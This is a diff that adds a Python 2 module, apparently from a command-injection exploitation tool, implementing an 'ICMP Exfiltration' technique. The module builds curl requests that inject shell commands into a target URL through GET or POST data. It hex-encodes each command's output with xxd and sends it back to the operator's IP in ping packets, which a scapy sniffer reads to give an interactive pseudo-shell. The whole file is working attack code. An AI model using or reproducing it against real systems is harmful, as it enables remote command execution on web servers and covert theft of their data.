@@ -1,0 +1,76 @@
+#!/bin/python
+
+import os
+import sys
+import time
+import signal
+import socket
+import threading
+
+from src.utils import colors
+from src.utils import settings
+
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+from scapy.all import *
+
+"""
+  The ICMP Exfiltration technique.
+"""
+
+def packet_handler(Packet):
+  if Packet.haslayer(ICMP):
+    Data = Packet.getlayer(ICMP).getlayer(Raw)
+    sys.stdout.write(Data.load[8:])
+    sys.stdout.flush()
+    
+def signal_handler(signal, frame):
+  sys.exit(0)
+
+def snif(ip_dst,ip_src):
+  print("(*) Starting the sniffer [" + colors.BOLD + colors.YELLOW + ip_src + colors.RESET + "] <--> [" + colors.BOLD + colors.YELLOW + ip_dst + colors.RESET + "]...")
+  while True:
+    sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
+			  
+def exploitation(ip_dst,ip_src,url,http_request_method,request_data):
+  signal.signal(signal.SIGINT, signal_handler)
+  sniffer_thread = threading.Thread(target=snif, args=(ip_dst,ip_src,)).start()
+  while True :
+    print ""
+    print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
+    while True:
+      try:
+	cmd = raw_input("Shell > ")
+	if cmd == "q":
+	  os._exit(0)
+	  
+	else:
+	  if http_request_method == "GET":
+	    payload = ('curl "'+ url + 
+		      '; for i in \$(' + cmd + 
+		      ' | xxd -ps -c8); do ping ' + ip_src + 
+		      ' -c1 -s16 -p \$i ; done"' + 
+		      '-s >/dev/null 2>&1'
+		      )
+
+	  else:
+	    payload = ('curl ' + url  + ' --data \"'+ request_data +'' +
+		      '; for i in \$(' + cmd + 
+		      ' | xxd -ps -c8); do ping ' + ip_src + 
+		      ' -c1 -s16 -p \$i ; done\"' +
+		      ' -s >/dev/null 2>&1'
+		      )
+	    
+	sys.stdout.write(colors.GREEN + colors.BOLD + "\n")
+	os.system(payload) 
+	sys.stdout.write("\n" + colors.RESET)
+	
+      except:
+	print ""
+	os._exit(0)
+	
+  sniffer_thread.join()
+
+if __name__ == "__main__":
+    main()
